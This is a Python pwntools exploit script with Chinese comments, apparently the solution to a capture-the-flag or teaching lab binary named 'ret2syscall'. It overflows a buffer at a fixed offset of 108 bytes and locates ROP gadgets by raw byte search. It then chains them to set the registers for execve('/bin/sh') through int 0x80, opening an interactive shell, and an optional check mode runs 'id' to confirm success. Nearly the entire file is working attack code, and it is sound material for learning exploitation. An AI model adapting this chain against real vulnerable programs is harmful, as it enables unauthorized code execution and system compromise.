#!/usr/bin/env python3
"""ret2syscall：不用任何库函数，直接用 int 0x80 执行 execve

    设置 eax=11（execve）、ebx="/bin/sh"、ecx=0、edx=0。

静态链接的二进制里 pwntools 的 ROP 数据集不一定收录全部 gadget，因此这里直接
按机器码字节搜索，跳到哪条字节序列，CPU 就从那里按该序列解码：
    pop eax; pop edx; pop ebx; ret  ->  58 5a 5b c3
    xor ecx, ecx; int 0x80          ->  31 c9 cd 80
"""
import sys

from pwn import context, ELF, p32, process

context(os="linux", arch="i386", log_level="error")

BINARY = "./ret2syscall"
CHECK = "--check" in sys.argv
OFFSET = 108


def find_bytes(elf, pattern, name):
    """在可执行段里按字节搜索 gadget，返回其虚拟地址"""
    exec_ranges = []
    for seg in elf.segments:
        if seg.header.p_type == "PT_LOAD" and (seg.header.p_flags & 1):
            exec_ranges.append((seg.header.p_vaddr, seg.header.p_vaddr + seg.header.p_memsz))
    for addr in elf.search(pattern):
        if any(lo <= addr < hi for lo, hi in exec_ranges):
            return addr
    raise RuntimeError(f"没有找到字节序列: {name}")


def main() -> int:
    elf = ELF(BINARY, checksec=False)

    pop3 = find_bytes(elf, b"\x58\x5a\x5b\xc3", "pop eax; pop edx; pop ebx; ret")
    xor_ecx_int80 = find_bytes(elf, b"\x31\xc9\xcd\x80", "xor ecx, ecx; int 0x80")
    binsh = elf.symbols["binsh"]
    argv = elf.symbols["argv_arr"]

    # pop3 依次弹出 eax、edx、ebx；再由 "xor ecx,ecx; int 0x80" 清空 ecx 并触发系统调用
    chain = b"".join(
        [
            p32(pop3), p32(11), p32(0), p32(binsh),  # eax=11, edx=0, ebx="/bin/sh"
            p32(xor_ecx_int80),                      # ecx=0; execve("/bin/sh", NULL, NULL)
        ]
    )

    p = process(BINARY)
    p.recvuntil(b"input:")
    p.sendline(b"A" * OFFSET + chain)

    if not CHECK:
        p.interactive()
        return 0

    p.sendline(b"id; exit")
    out = p.recvall(timeout=3)
    ok = b"uid=" in out
    print(
        f"[ret2syscall] {'PASS' if ok else 'FAIL'}  "
        f"pop3={pop3:#x} xor_ecx_int80={xor_ecx_int80:#x} "
        f"binsh={binsh:#x} argv={argv:#x}"
    )
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())